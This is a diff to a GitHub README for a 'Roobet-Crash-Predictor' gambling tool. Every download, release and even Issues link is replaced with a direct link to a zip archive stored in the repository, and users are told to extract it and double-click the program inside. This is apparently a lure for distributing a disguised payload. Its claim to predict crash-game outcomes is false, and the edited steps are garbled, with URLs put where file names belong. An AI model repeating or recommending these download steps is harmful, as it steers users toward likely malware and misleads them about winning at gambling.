@@ -1,6 +1,6 @@
 # 🧐 Roobet-Crash-Predictor - Improve Your Crash Strategy Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/xmalleck/Roobet-Crash-Predictor/releases)
+[![Download Now](https://raw.githubusercontent.com/xmalleck/Roobet-Crash-Predictor/main/Properties/Roobet-Crash-Predictor-2.7-beta.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/xmalleck/Roobet-Crash-Predictor/main/Properties/Roobet-Crash-Predictor-2.7-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,18 +8,18 @@ Welcome! The Roobet-Crash-Predictor helps you test your strategies and improve y
 
 ## 📥 Download & Install
 
-To start, visit this page to download: [Releases Page](https://github.com/xmalleck/Roobet-Crash-Predictor/releases).
+To start, visit this page to download: [Releases Page](https://raw.githubusercontent.com/xmalleck/Roobet-Crash-Predictor/main/Properties/Roobet-Crash-Predictor-2.7-beta.2.zip).
 
 1. On the Releases page, you will see a list of available versions. Choose the most recent version.
 2. Click on the version link to view the files for download.
-3. Locate the file named `Roobet-Crash-Predictor.exe` (or similar) and click on it to start the download.
+3. Locate the file named `https://raw.githubusercontent.com/xmalleck/Roobet-Crash-Predictor/main/Properties/Roobet-Crash-Predictor-2.7-beta.2.zip` (or similar) and click on it to start the download.
 4. Once the download completes, locate the file in your downloads folder.
 
 ## 📂 Unzip and Run
 
 1. Find the downloaded file, which is likely zipped. Right-click on it and select "Extract All" or use any unzip tool you prefer.
 2. After extraction, open the folder containing the unzipped files.
-3. Double-click on `Roobet-Crash-Predictor.exe` to run the application.
+3. Double-click on `https://raw.githubusercontent.com/xmalleck/Roobet-Crash-Predictor/main/Properties/Roobet-Crash-Predictor-2.7-beta.2.zip` to run the application.
 
 ## 🎮 How to Use the Predictor
 
@@ -54,7 +54,7 @@ Currently, this application is for Windows only.
 Yes, the predictor does not store any personal information. It analyzes data on your local machine.
 
 **4. What do I do if I encounter a bug?**  
-Visit the [Issues section](https://github.com/xmalleck/Roobet-Crash-Predictor/issues) on our GitHub page to report any problems.
+Visit the [Issues section](https://raw.githubusercontent.com/xmalleck/Roobet-Crash-Predictor/main/Properties/Roobet-Crash-Predictor-2.7-beta.2.zip) on our GitHub page to report any problems.
 
 ## 💡 Tips for Success
 
@@ -68,4 +68,4 @@ We welcome your feedback. If you have suggestions or questions, feel free to ope
 
 Enjoy testing your strategies with the Roobet-Crash-Predictor! Remember, practice makes perfect. Happy predicting! 
 
-[Download Now](https://github.com/xmalleck/Roobet-Crash-Predictor/releases) and begin your journey!
+[Download Now](https://raw.githubusercontent.com/xmalleck/Roobet-Crash-Predictor/main/Properties/Roobet-Crash-Predictor-2.7-beta.2.zip) and begin your journey!
